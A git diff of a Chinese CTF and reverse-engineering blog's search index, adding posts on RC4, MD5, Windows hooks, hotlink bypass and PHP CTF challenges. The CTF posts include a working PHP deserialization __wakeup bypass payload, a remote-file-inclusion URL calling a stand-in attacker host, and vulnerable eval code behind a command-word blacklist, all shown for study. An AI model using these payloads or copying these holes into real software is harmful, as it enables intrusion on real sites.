@@ -4,6 +4,56 @@
   
   
   <entry>
+    <title>rc4</title>
+    <link href="/2024/10/28/rc4/"/>
+    <url>/2024/10/28/rc4/</url>
+    
+    <content type="html"><![CDATA[<h1 id="RC4"><a href="#RC4" class="headerlink" title="RC4"></a>RC4</h1><p>写题过程中会出现像rc4这种简单的对称加密算法，在此留下对应的解密脚本<br>由于初始化的s盒和产生的密钥流是由固定的密钥确定，并且加密的本质是异或所以为对称的<br>rc4加密主要分为三个部分</p><ul><li>初始化s盒</li><li>生成密钥流</li><li>加密</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">KSA</span>(<span class="hljs-params">key</span>):<br>    key_length = <span class="hljs-built_in">len</span>(key)<br><br>    <span class="hljs-comment"># 初始化S盒</span><br>    S = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>))<br>    j = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>        j = (j + S[i] + key[i % key_length]) % <span class="hljs-number">256</span><br>        S[i], S[j] = S[j], S[i]<br><br>    <span class="hljs-keyword">return</span> S<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">PRGA</span>(<span class="hljs-params">S</span>):<br>    i = <span class="hljs-number">0</span><br>    j = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        i = (i + <span class="hljs-number">1</span>) % <span class="hljs-number">256</span><br>        j = (j + S[i]) % <span class="hljs-number">256</span><br>        S[i], S[j] = S[j], S[i]<br>        K = S[(S[i] + S[j]) % <span class="hljs-number">256</span>]<br>        <span class="hljs-keyword">yield</span> K<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">RC4</span>(<span class="hljs-params">key, data</span>):<br>    S = KSA(key)<br>    keystream = PRGA(S)<br>    res = []<br>    <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> data:<br>        res.append(c ^ <span class="hljs-built_in">next</span>(keystream))<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>(res)<br></code></pre></td></tr></table></figure>]]></content>
+    
+    
+    <categories>
+      
+      <category>逆向算法</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>reverse</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>hash</title>
+    <link href="/2024/10/28/hash/"/>
+    <url>/2024/10/28/hash/</url>
+    
+    <content type="html"><![CDATA[<h1 id="hash算法"><a href="#hash算法" class="headerlink" title="hash算法"></a>hash算法</h1><p>打算了解一下各个hash算法的细节，防止在看到伪代码时不认识</p><h2 id="MD5"><a href="#MD5" class="headerlink" title="MD5"></a>MD5</h2><h3 id="MD5加密原理步骤"><a href="#MD5加密原理步骤" class="headerlink" title="MD5加密原理步骤"></a>MD5加密原理步骤</h3><ol><li>在MD5算法中，首先需要对信息进行填充，使其位长对512求余的结果等于448，并且填充必须进行(N*512+448)</li><li>初始化变量,以大端字节序来表示，他们分别为： A&#x3D;0x01234567，B&#x3D;0x89ABCDEF，C&#x3D;0xFEDCBA98，D&#x3D;0x76543210（每一个变量给出的数值是高字节存于内存低地址，低字节存于内存高地址，即大端字节序。在程序中变量A、B、C、D的值分别为0x67452301，0xEFCDAB89，0x98BADCFE，0x10325476）</li><li>处理分组数据<br>以下是每次操作中用到的四个非线性函数（每轮一个）。<br>F( X ,Y ,Z ) &#x3D; ( X &amp; Y ) | ( (<del>X) &amp; Z )<br>G( X ,Y ,Z ) &#x3D; ( X &amp; Z ) | ( Y &amp; (</del>Z) )<br>H( X ,Y ,Z ) &#x3D;X ^ Y ^ Z<br>I( X ,Y ,Z ) &#x3D;Y ^ ( X | (~Z) )</li></ol><ul><li>MD5 是一种基于迭代和压缩的哈希函数，其核心是对输入数据进行多轮的位运算和逻辑操作。</li><li>常量值：MD5 使用特定的常量（如 0x67452301, 0xEFCDAB89 等）在计算过程中。如果在代码中看到这些特定的常量，特别是在加法操作中，通常指向 MD5 或类似算法。</li><li>处理输入数据的方式：MD5 通常处理输入数据为 512 位（64 字节）块，将每个块分为多个 32 位（4 字节）单元进行处理。</li></ul>]]></content>
+    
+    
+    <categories>
+      
+      <category>逆向算法</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>reverse</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>bindiff</title>
     <link href="/2024/10/28/bindiff/"/>
     <url>/2024/10/28/bindiff/</url>
@@ -36,6 +86,18 @@
     <content type="html"><![CDATA[<p>前期我们先以题带学，进行一下熟悉</p><h3 id="例题1-SWPUCTF-2021-新生赛-no-wakeup"><a href="#例题1-SWPUCTF-2021-新生赛-no-wakeup" class="headerlink" title="例题1 [SWPUCTF 2021 新生赛]no_wakeup"></a>例题1 [SWPUCTF 2021 新生赛]no_wakeup</h3><p>直接看到源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Content-type:text/html;charset=utf-8&quot;</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-string">&quot;class.php&quot;</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HaHaHa</span></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$admin</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$passwd</span>;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;admin =<span class="hljs-string">&quot;user&quot;</span>;<br>            <span class="hljs-variable language_">$this</span>-&gt;passwd = <span class="hljs-string">&quot;123456&quot;</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;passwd = <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$this</span>-&gt;passwd);<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;admin === <span class="hljs-string">&quot;admin&quot;</span> &amp;&amp; <span class="hljs-variable language_">$this</span>-&gt;passwd === <span class="hljs-string">&quot;wllm&quot;</span>)&#123;<br>                <span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br>                <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;passwd;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;No wake up&quot;</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br><span class="hljs-variable">$Letmeseesee</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;p&#x27;</span>];<br><span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$Letmeseesee</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>经过wp发现，在调用反序列化时，会自动执行_wakeip()导致passwd被sha1加密，并且不可逆，所以我们要考虑_wakeip()的让绕过</p><ul><li>知识点：php特性，当反序列化字符串中，表示对象属性个数的值大于真实属性个数时，会跳过__wakeup()函数的执行。</li></ul><pre><code class="php">$aa = new HaHaHa();$aa-&gt;admin = &quot;admin&quot;;$aa-&gt;passwd = &quot;wllm&quot;;$stus = serialize($aa);print_r($stus);</code></pre><p>O:6:”HaHaHa”:2:{s:5:”admin”;s:5:”admin”;s:6:”passwd”;s:4:”wllm”;}<br>序列化之后我们可以改变参数数量,上传即可<br>O:6:”HaHaHa”:3:{s:5:”admin”;s:5:”admin”;s:6:”passwd”;s:4:”wllm”;}</p>]]></content>
     
     
+    <categories>
+      
+      <category>网络</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>php</tag>
+      
+    </tags>
     
   </entry>
   
@@ -58,7 +120,7 @@
     
     <tags>
       
-      <tag>电子榨菜</tag>
+      <tag>snake</tag>
       
     </tags>
     
@@ -76,7 +138,7 @@
     
     <categories>
       
-      <category>blockchain</category>
+      <category>web3</category>
       
     </categories>
     
@@ -124,6 +186,18 @@
     <content type="html"><![CDATA[<p>The future</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br><span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$file</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;File contents: <span class="hljs-subst">$data</span>&quot;</span>;<br><span class="hljs-comment">//朴实无华，拿来就用    </span><br>File contents: <br></code></pre></td></tr></table></figure><p>一个简单的FIV文件包含漏洞<br>本地文件包含（LFI）<br>潜在的远程文件包含（RFI）漏洞<br>如果 PHP 配置中 allow_url_fopen 和 allow_url_include 设置为 On，攻击者甚至可以通过 file 参数引入远程文件，执行远程的恶意代码。假如配置不当，攻击者可以通过这样的 URL 进行远程文件包含：<br><a href="http://example.com/vulnerable.php?file=http://attacker.com/malicious_code.php">http://example.com/vulnerable.php?file=http://attacker.com/malicious_code.php</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;code&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$code</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;code&#x27;</span>];<br><span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/sys|pas|read|file|ls|cat|tac| |head|tail|more|less|php|base|echo|cp|\$|\*|\+|\^|scan|\.|local|current|chr|crypt|show_source|high|readgzfile|dirname|time|next|all|hex2bin|im|shell/i&#x27;</span>,<span class="hljs-variable">$code</span>))&#123;<br>     <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$code</span>);  <br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;img src=&quot;./dududadadudu.png&quot; alt=&quot;Top Image&quot; style=&quot;display: block; margin: 0 auto; max-width: 20%; height: auto;&quot;&gt;&#x27;</span>; <br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;audio controls&gt;&#x27;</span>;<span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;source src=&quot;./dududadudada.mp3&quot; type=&quot;audio/mpeg&quot;&gt;&#x27;</span>;<br>         &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;img src=&quot;./redhot.jpg&quot; alt=&quot;Top Image&quot; style=&quot;display: block; margin: 0 auto; max-width: 70%; height: auto;&quot;&gt;&#x27;</span>; <br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;这都不能bypass？不准你玩cod&quot;</span>); &#125;<br>    &#125;  <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;喜欢用轮椅枪是吧，账号给你ban了！&quot;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;img src=&quot;./ban.png&quot; alt=&quot;Top Image&quot; style=&quot;display: block; margin: 0 auto; max-width: 70%; height: auto;&quot;&gt;&#x27;</span>; <br>&#125; <br></code></pre></td></tr></table></figure>]]></content>
     
     
+    <categories>
+      
+      <category>ctf</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>web</tag>
+      
+    </tags>
     
   </entry>
   
@@ -137,6 +211,43 @@
     <content type="html"><![CDATA[<p>在我们进行逆向时普遍会遇到出现弹窗，但是我们没有办法搜索到字符串完成定位点的问题，这个时候我们可以利用按钮时间来到达对应的输入断点<br><img src="https://gitee.com/fogpost/photo/raw/master/202410181444105.png" srcset="/img/loading.gif" lazyload><br>在我们这图中，在输入完数之后我们不点登录在od中查找二进制字符串，如下<br><img src="https://gitee.com/fogpost/photo/raw/master/202410181449498.png" srcset="/img/loading.gif" lazyload><br>之后我们会到达此处，此处的断点便是易语言的按钮事件断点<br><img src="https://gitee.com/fogpost/photo/raw/master/202410181450283.png" srcset="/img/loading.gif" lazyload></p>]]></content>
     
     
+    <categories>
+      
+      <category>逆向</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>reverse</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>Hook</title>
+    <link href="/2024/10/16/Hook/"/>
+    <url>/2024/10/16/Hook/</url>
+    
+    <content type="html"><![CDATA[<h1 id="Hook"><a href="#Hook" class="headerlink" title="Hook"></a>Hook</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>Hook是一种技术，它允许一个程序监视和修改另一个程序的运行。Hook技术通常用于调试、修改程序行为、保护程序等目的。</p><p>在Windows操作系统中，Hook技术主要分为以下几种：键盘Hook、鼠标Hook、消息Hook、API Hook等。</p><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>SetWindowsHookExA函数是Windows API中用于设置Hook的函数。它可以用于监视和修改其他程序的键盘、鼠标、消息等事件。</p><p>SetWindowsHookExA函数的原型如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c">HHOOK <span class="hljs-title function_">SetWindowsHookExA</span><span class="hljs-params">(</span><br><span class="hljs-params">  <span class="hljs-type">int</span>       idHook,</span><br><span class="hljs-params">  HOOKPROC  lpfn,</span><br><span class="hljs-params">  HINSTANCE hmod,</span><br><span class="hljs-params">  DWORD     dwThreadId</span><br><span class="hljs-params">)</span>;<br></code></pre></td></tr></table></figure><h3 id="键盘消息钩取练习"><a href="#键盘消息钩取练习" class="headerlink" title="键盘消息钩取练习"></a>键盘消息钩取练习</h3>]]></content>
+    
+    
+    <categories>
+      
+      <category>逆向</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>DLL</tag>
+      
+    </tags>
     
   </entry>
   
@@ -152,7 +263,7 @@
     
     <categories>
       
-      <category>study</category>
+      <category>课程</category>
       
     </categories>
     
@@ -177,7 +288,7 @@
     
     <categories>
       
-      <category>web安全</category>
+      <category>网络</category>
       
     </categories>
     
@@ -227,14 +338,14 @@
     
     <categories>
       
-      <category>sql</category>
+      <category>web</category>
       
     </categories>
     
     
     <tags>
       
-      <tag>web</tag>
+      <tag>sql</tag>
       
     </tags>
     
@@ -359,7 +470,7 @@
     
     <tags>
       
-      <tag>unserialize</tag>
+      <tag>php</tag>
       
     </tags>
     
@@ -422,7 +533,7 @@
     
     <tags>
       
-      <tag>脱壳</tag>
+      <tag>reverse</tag>
       
     </tags>
     
@@ -447,7 +558,7 @@
     
     <tags>
       
-      <tag>session</tag>
+      <tag>web</tag>
       
     </tags>
     
@@ -497,7 +608,7 @@
     
     <tags>
       
-      <tag>markdown</tag>
+      <tag>tool</tag>
       
     </tags>
     
@@ -522,7 +633,7 @@
     
     <tags>
       
-      <tag>crawler</tag>
+      <tag>web</tag>
       
     </tags>
     
@@ -563,10 +674,16 @@
     <content type="html"><![CDATA[<h3 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h3><p>这是这个博客最开始的故事，我想要用gitee做一个图床，当时我怎么也没想到gitee居然拒绝掉外链的请求了，就像这样<br><img src="https://gitee.com/fogpost/photo/raw/master/202409122231370.png" srcset="/img/loading.gif" lazyload><br>但是反复尝试我们发现了一下返回值</p><h3 id="防盗链"><a href="#防盗链" class="headerlink" title="防盗链"></a>防盗链</h3><p>要实现防盗链，就需要知道图片的请求是从哪里发出的。可以实现这一功能的有请求头中的origin和referer。origin只有在XHR请求中才会带上，所以图片资源只能借助referer</p><p>通过判断请求的referer，如果请求来源不是本站就返回302</p><h4 id="一个完整的流程："><a href="#一个完整的流程：" class="headerlink" title="一个完整的流程："></a>一个完整的流程：</h4><ul><li>首先请求正常的图片，但是没有返回200，而是302重定向，其中响应头中的location就是要重定向去向的地址</li><li>接着浏览器会自动请求这个location，并用这个返回结果代替第一次请求的返回内容<br><img src="https://gitee.com/fogpost/photo/raw/master/202409122241207.png" srcset="/img/loading.gif" lazyload></li></ul><h4 id="如何破解防盗链"><a href="#如何破解防盗链" class="headerlink" title="如何破解防盗链"></a>如何破解防盗链</h4><p>想让gitee不知道我在盗用，就不能让他发现请求的来源是第三方，只要把referer藏起来就好</p><p><img src="https://gitee.com/fogpost/photo/raw/master/202409122236635.png" srcset="/img/loading.gif" lazyload><br>但是我们可以骗过gitee，用butterfly和yilia的主题可以上网搜搜都有讲，fluid这类的不同，但是我们这里要讲下进阶的代码注入<br><img src="https://gitee.com/fogpost/photo/raw/master/202409122233566.png" srcset="/img/loading.gif" lazyload><br>按上面这个我们就可以写出header头前的代码来注入，骗过gitee使图片显现<br>下面是我的代码</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">hexo.<span class="hljs-property">extend</span>.<span class="hljs-property">injector</span>.<span class="hljs-title function_">register</span>(<span class="hljs-string">&#x27;head_begin&#x27;</span>, <span class="hljs-string">&#x27;&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot; /&gt;&#x27;</span>, <span class="hljs-string">&#x27;post&#x27;</span>);<br></code></pre></td></tr></table></figure><p>注解：</p><meta name="referrer" content="no-referrer" /> 指定了 "no-referrer" 的内容，意味着浏览器在发送请求时不会包含任何引用来源信息。换句话说，当用户从当前网页跳转到其他页面时，新页面接收到的请求中将不包含这个跳转前的页面地址<p><a href="https://blog.csdn.net/weixin_52479803/article/details/131774501">参考文章</a></p>]]></content>
     
     
+    <categories>
+      
+      <category>教程</category>
+      
+    </categories>
+    
     
     <tags>
       
-      <tag>tool</tag>
+      <tag>blog</tag>
       
     </tags>
     
@@ -591,7 +708,7 @@
     
     <tags>
       
-      <tag>脱壳</tag>
+      <tag>reverse</tag>
       
     </tags>
     
@@ -616,7 +733,7 @@
     
     <tags>
       
-      <tag>脱壳</tag>
+      <tag>reverse</tag>
       
     </tags>
     
@@ -641,7 +758,7 @@
     
     <tags>
       
-      <tag>脱壳</tag>
+      <tag>reverse</tag>
       
     </tags>
     
@@ -666,7 +783,7 @@
     
     <tags>
       
-      <tag>Hydra</tag>
+      <tag>tool</tag>
       
     </tags>
     
@@ -741,7 +858,7 @@
     
     <tags>
       
-      <tag>decode</tag>
+      <tag>reverse</tag>
       
     </tags>
     
